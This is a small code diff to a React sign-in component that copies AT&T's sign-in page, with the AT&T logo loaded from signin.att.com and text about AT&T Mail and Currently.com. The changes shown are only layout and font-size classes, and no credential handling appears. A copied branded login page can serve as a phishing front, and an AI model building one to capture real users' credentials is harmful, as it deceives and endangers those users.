@@ -38,11 +38,11 @@ const Signin = () => {
     'https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg'
 
   return (
-    <div className='w-screen h-screen flex items-center justify-center'>
+    <div className='w-[100%] h-[100%] md:w-screen md:h-screen flex items-center justify-center xs:my-16 md:my-auto'>
       <section className='flex flex-col items-center font-bold w-[25rem] md:border gap-2 rounded-2xl'>
         <img src={imgSrc} alt='' className='my-3 md:my-5' width={150} />
         <h2 className='text-3xl md:text-4xl'>Sign in</h2>
-        <h3 className=' text-xl md:text-2xl text-center'>
+        <h3 className='text-2xl text-center'>
           to access AT&T Mail and Currently.com
         </h3>
 
